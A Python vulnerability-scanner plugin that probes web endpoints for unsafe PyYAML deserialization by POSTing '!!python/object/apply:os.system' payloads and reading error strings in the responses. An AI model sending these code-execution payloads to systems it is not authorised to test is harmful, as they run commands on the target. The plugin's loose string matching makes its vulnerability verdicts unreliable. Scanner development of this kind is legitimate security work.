"""
Plugin 1233: Python YAML Deserialization Detection
====================================================
Detects Python YAML deserialization vulnerabilities using yaml.load()
instead of yaml.safe_load(). Malicious YAML can execute arbitrary
Python objects via !!python/object tags.
"""
import asyncio
import ssl
import urllib.parse

from plugins import NaslPlugin, PluginResult


class PythonYamlDeserialization(NaslPlugin):
    PLUGIN_ID = 1233
    NAME = 'Python YAML Deserialization Detection'
    FAMILY = 'Web Applications'
    CVSS_SCORE = 9.8
    DESCRIPTION = (
        'Detects Python YAML deserialization vulnerabilities using yaml.load() '
        'instead of yaml.safe_load(). Malicious YAML can execute arbitrary Python '
        'objects via !!python/object tags, leading to RCE.'
    )
    SOLUTION = (
        'Always use yaml.safe_load() instead of yaml.load(). Avoid loading YAML '
        'from untrusted sources. Use JSON as a safer alternative for data exchange.'
    )
    CVE = ['CVE-2017-18342']
    PORTS = [80, 443, 8080, 8443]

    YAML_PAYLOADS = [
        '!!python/object/object:__main__.Foo',
        '!!python/object/new:os.system ["id"]',
        '!!python/object/apply:os.system ["id"]',
        '!!python/object/apply:subprocess.check_output [["id"]]',
    ]

    ENDPOINTS = [
        '/api/yaml', '/api/parse', '/api/config', '/api/data',
        '/yaml', '/parse', '/config', '/api/v1/yaml',
    ]

    async def check_target(self, target: str, port: int | None = None) -> list[PluginResult]:
        results = []

        for port_to_check in (self.PORTS if port is None else [port]):
            try:
                scheme = 'https' if port_to_check in (443, 8443) else 'http'
                ctx = None
                if scheme == 'https':
                    ctx = ssl.create_default_context()
                    ctx.check_hostname = False
                    ctx.verify_mode = ssl.CERT_NONE

                host_header = target
                if target in ('127.0.0.1', 'localhost', '::1'):
                    host_header = 'alieninc.tech'

                for endpoint in self.ENDPOINTS:
                    for payload in self.YAML_PAYLOADS:
                        try:
                            yaml_body = f'data: {payload}\n'
                            reader, writer = await asyncio.wait_for(
                                asyncio.open_connection(target, port_to_check, ssl=ctx),
                                timeout=5
                            )
                            req = (
                                f'POST {endpoint} HTTP/1.1\r\n'
                                f'Host: {host_header}\r\n'
                                f'Content-Type: application/x-yaml\r\n'
                                f'Content-Length: {len(yaml_body)}\r\n'
                                f'User-Agent: Centra/1.0\r\n'
                                f'Connection: close\r\n\r\n'
                                f'{yaml_body}'
                            )
                            writer.write(req.encode())
                            await writer.drain()

                            response = b''
                            try:
                                while True:
                                    chunk = await asyncio.wait_for(reader.read(4096), timeout=3)
                                    if not chunk:
                                        break
                                    response += chunk
                                    if len(response) > 16384:
                                        break
                            except asyncio.TimeoutError:
                                pass
                            writer.close()
                            await writer.wait_closed()

                            body = response.split(b'\r\n\r\n', 1)
                            body_text = body[1].decode('utf-8', errors='ignore') if len(body) > 1 else ''

                            indicators = ['yaml', 'constructor', 'yaml.load', 'alias',
                                          'could not determine', 'found undefined',
                                          'expected', 'unhashable']
                            if any(ind in body_text.lower() for ind in indicators):
                                results.append(PluginResult(
                                    vulnerable=True,
                                    target=target,
                                    port=port_to_check,
                                    cvss_score=self.CVSS_SCORE,
                                    severity='critical',
                                    description=f'Python YAML deserialization detected at {endpoint}',
                                    solution=self.SOLUTION,
                                    evidence=f'Endpoint: {endpoint}, payload: {payload}, error indicators found',
                                    references=[
                                        'https://owasp.org/www-community/attacks/Deserialization_of_untrusted_data',
                                    ]
                                ))
                                break
                        except (asyncio.TimeoutError, ConnectionRefusedError, OSError, ssl.SSLError):
                            pass
                    if results:
                        break

            except (asyncio.TimeoutError, ConnectionRefusedError, OSError, ssl.SSLError):
                pass

        if not results:
            results.append(PluginResult(
                vulnerable=False, target=target, port=port or 0,
                description='No Python YAML deserialization indicators detected on checked ports'
            ))

        return results
